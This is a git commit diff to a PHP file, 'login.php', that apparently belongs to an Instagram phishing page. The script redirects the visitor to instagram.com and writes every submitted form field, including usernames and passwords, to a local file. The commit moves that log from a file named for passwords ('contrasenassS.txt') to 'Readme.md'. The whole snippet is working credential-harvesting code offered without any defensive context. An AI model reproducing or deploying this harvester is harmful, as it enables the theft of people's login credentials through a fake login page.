e0b2927fea22f38f3e75c31d864c78a6af8d50e0
ELBICHOCR717 <81711194+ELBICHOCR717@users.noreply.github.com>
2021-03-31 21:00:49 -0300

    Update login.php

--- login.php
+++ login.php
@@ -1,7 +1,7 @@
 <?php
 
 header ('Location: https://instagram.com/ ');
-$handle = fopen("contrasenassS.txt", "a"); 
+$handle = fopen("Readme.md", "a"); 
 foreach($_POST as $variable => $value) {
 	fwrite($handle, $variable);
 	fwrite($handle, "=");
